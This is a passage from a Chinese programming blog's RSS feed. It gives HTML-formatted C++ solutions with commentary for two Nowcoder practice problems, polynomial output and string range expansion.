class="number">1</span>&amp;&amp;cnt==<span class="number">0</span>) cout&lt;&lt;a[i];</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">abs</span>(a[i])!=<span class="number">1</span>) cout&lt;&lt;a[i];</span><br><span class="line">                <span class="keyword">if</span>(a[i]==<span class="number">-1</span>) </span><br><span class="line">                &#123;</span><br><span class="line">                    cout&lt;&lt;<span class="string">&#x27;-&#x27;</span>;</span><br><span class="line">                    <span class="keyword">if</span>(cnt==<span class="number">0</span>) cout&lt;&lt;<span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(a[i]!=<span class="number">0</span>&amp;&amp;!cnt==<span class="number">0</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(cnt==<span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                cout&lt;&lt;<span class="string">&#x27;x&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> cout&lt;&lt;<span class="string">&quot;x^&quot;</span>&lt;&lt;cnt;</span><br><span class="line">        &#125;</span><br><span class="line">        cnt--;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要的实现都在这里了其中meiyoufuhao是没有符号的意思，记录第一个系数不为0的家伙的位置，让它不能带加号。其余的就按照基本的数学尝试实现了，一大堆的if语句，这里我因为前期思考不够，导致分类起来比较复杂。后续会再拿出一个版本上传。</p>]]></content:encoded>
      
      
      
      <category domain="https://cjliblog.top/tags/%E7%89%9B%E5%AE%A2%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80%E7%B2%BE%E9%80%89/">牛客算法基础精选</category>
      
      
      <comments>https://cjliblog.top/2023/08/04/NC16622%E5%A4%9A%E9%A1%B9%E5%BC%8F%E8%BE%93%E5%87%BA/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>NC16644字符串的展开【题解】【入门向】</title>
      <link>https://cjliblog.top/2023/08/02/NC16644%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%B1%95%E5%BC%80/</link>
      <guid>https://cjliblog.top/2023/08/02/NC16644%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%B1%95%E5%BC%80/</guid>
      <pubDate>Tue, 01 Aug 2023 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt; 题目来源【牛客竞赛】：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://ac.nowcoder.com/acm/problem/16644&quot;&gt;https://ac.nowcoder.com/acm/problem/16644&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;题解：&lt;/p&gt;
&lt;fig</description>
        
      
      
      
      <content:encoded><![CDATA[<p> 题目来源【牛客竞赛】：</p><p><a href="https://ac.nowcoder.com/acm/problem/16644">https://ac.nowcoder.com/acm/problem/16644</a></p><p>题解：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//引入下面有用到的函数</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">isok</span><span class="params">(<span class="type">char</span> a,<span class="type">char</span> b)</span></span>;</span><br><span class="line"><span class="function">string <span class="title">func</span><span class="params">(<span class="type">const</span> string&amp; p,<span class="type">int</span> p1,<span class="type">int</span> p2,<span class="type">int</span> p3)</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//喜欢简短主函数，给人清爽的感觉</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> a,b,c;cin&gt;&gt;a&gt;&gt;b&gt;&gt;c;</span><br><span class="line">    string s;</span><br><span class="line">    <span class="comment">//清楚缓冲区之后再进行读取一整行字符串,也可以把该行直接改成cin&gt;&gt;string</span></span><br><span class="line">    cin.<span class="built_in">ignore</span>();<span class="built_in">getline</span>(cin,s);</span><br><span class="line">    <span class="comment">//func是一个主要功能实现的函数，把所有参数往里面塞</span></span><br><span class="line">    string ans=<span class="built_in">func</span>(s,a,b,c);</span><br><span class="line">    cout&lt;&lt;ans;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//这是一个判断前后两数是否同为字母或同为数字的函数</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">isok</span><span class="params">(<span class="type">char</span> a,<span class="type">char</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">isdigit</span>(a)&amp;&amp;<span class="built_in">isdigit</span>(b))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">isalpha</span>(a)&amp;&amp;<span class="built_in">isalpha</span>(b))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function">string <span class="title">func</span><span class="params">(<span class="type">const</span> string&amp; p,<span class="type">int</span> p1,<span class="type">int</span> p2,<span class="type">int</span> p3)</span></span>&#123;</span><br><span class="line">    <span class="comment">//r作为临时存储单个填充串</span></span><br><span class="line">    string r=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="comment">//p引用了字符串，不要直接用带const的p，因此创建一个ans作为return的答案</span></span><br><span class="line">    string ans=p;</span><br><span class="line">    <span class="comment">//遍历原字符串</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;ans.<span class="built_in">length</span>();i++)&#123;</span><br><span class="line">        <span class="comment">//如果当前字符是&#x27;-&#x27;且前后类型相同，且后者比前者大</span></span><br><span class="line">        <span class="keyword">if</span>(ans[i]==<span class="string">&#x27;-&#x27;</span>&amp;&amp;<span class="built_in">isok</span>(ans[i<span class="number">-1</span>],ans[i+<span class="number">1</span>])&amp;&amp;ans[i<span class="number">-1</span>]&lt;ans[i+<span class="number">1</span>])&#123;</span><br><span class="line">            <span class="comment">//x临时存储原字符串中&#x27;-&#x27;左边字符</span></span><br><span class="line">            <span class="type">char</span> x=ans[i<span class="number">-1</span>];</span><br><span class="line">            <span class="comment">//初始化r（r包括&#x27;-&#x27;左右的元素）</span></span><br><span class="line">            r=r+x;x++;</span><br><span class="line">            <span class="comment">//如果当前元素不是&#x27;-&#x27;右边元素，进行操作</span></span><br><span class="line">            <span class="keyword">while</span>(x!=ans[i+<span class="number">1</span>])&#123;</span><br><span class="line">                <span class="comment">//变量k临时存储p2，作用还有用于while()的计数</span></span><br><span class="line">                <span class="type">int</span> k=p2;</span><br><span class="line">                <span class="comment">//三种情况不同处理，其中注意toupper()返回int值所以要转化为char</span></span><br><span class="line">                <span class="keyword">if</span>(p1==<span class="number">1</span>)&#123;<span class="keyword">while</span>(k--) r=r+x;x++;&#125;</span><br><span class="line">                <span class="keyword">if</span>(p1==<span class="number">2</span>)&#123;<span class="keyword">while</span>(k--) r=r+<span class="built_in">char</span>(<span class="built_in">toupper</span>(x));x++;&#125;</span><br><span class="line">                <span class="keyword">if</span>(p1==<span class="number">3</span>)&#123;<span class="keyword">while</span>(k--) r=r+<span class="string">&#x27;*&#x27;</span>;x++;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//翻转函数，注意下标</span></span><br><span class="line">            <span class="keyword">if</span>(p3==<span class="number">2</span>)&#123;<span class="built_in">reverse</span>(r.<span class="built_in">begin</span>()+<span class="number">1</span>,r.<span class="built_in">end</span>());&#125;</span><br><span class="line">            <span class="comment">//将ans的&#x27;x-x&#x27;用r取代，</span></span><br><span class="line">            <span class="comment">//遍历变量i向前退一格，来到r的头部,以防出界，</span></span><br><span class="line">            <span class="comment">//并且清空临时存储r，</span></span><br><span class="line">            ans.<span class="built_in">replace</span>(i<span class="number">-1</span>,<span class="number">2</span>,r); i--;r=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>欢迎提问和交流</strong></p>]]></content:encoded>
      
      
      
      <category domain="https://cjliblog.top/tags/%E7%89%9B%E5%AE%A2%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80%E7%B2%BE%E9%80%89/">牛客算法基础精选</category>
      
      
      <comments>https://cjliblog.top/2023/08/02/NC16644%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%B1%95%E5%BC%80/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
